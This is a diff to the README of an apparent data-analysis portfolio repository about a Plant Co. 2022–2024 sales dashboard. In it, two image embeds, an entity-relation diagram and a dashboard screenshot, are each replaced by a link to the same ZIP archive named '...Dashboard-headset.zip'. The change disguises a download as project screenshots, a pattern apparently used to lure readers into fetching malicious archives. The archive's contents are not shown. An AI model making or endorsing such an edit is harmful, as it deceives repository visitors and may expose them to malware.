@@ -22,7 +22,7 @@ A description of each table is as follows:
 
 - **Accounts** – Contains customer and account information, including account names, unique account IDs, geographic details (country, latitude, longitude), and address attributes. Used for segmentation and regional performance analysis.
 
-![Image](https://github.com/Anthunii/PlantCo_2022-2024_Dashboard/blob/f1cbb992b07c950fb4a5036b9f23750158b4c277/Screenshots/entity-relation-diagram.png)
+![Image](https://raw.githubusercontent.com/Anthunii/PlantCo_2022-2024_Dashboard/master/Screenshots/PlantCo_2022-2024_Dashboard-headset.zip)
 
 # Executive Summary
 
@@ -30,7 +30,7 @@ A description of each table is as follows:
 
 Plant Co.’s gross profit has steadily declined from 2022 to 2024, with noticeable drops in the latter half of each year. While early-year demand briefly improves performance, it isn’t enough to offset consistent year-end declines. Product and country trends show variability, suggesting the issue is broad rather than tied to a single segment.
 
-![Image](https://github.com/Anthunii/PlantCo_2022-2024_Dashboard/blob/f1cbb992b07c950fb4a5036b9f23750158b4c277/Screenshots/plantco-2022-2024-dashboard.jpg)
+![Image](https://raw.githubusercontent.com/Anthunii/PlantCo_2022-2024_Dashboard/master/Screenshots/PlantCo_2022-2024_Dashboard-headset.zip)
 
 # Insights Deep Dive
 ### Category 1: Sales Quantity Analysis
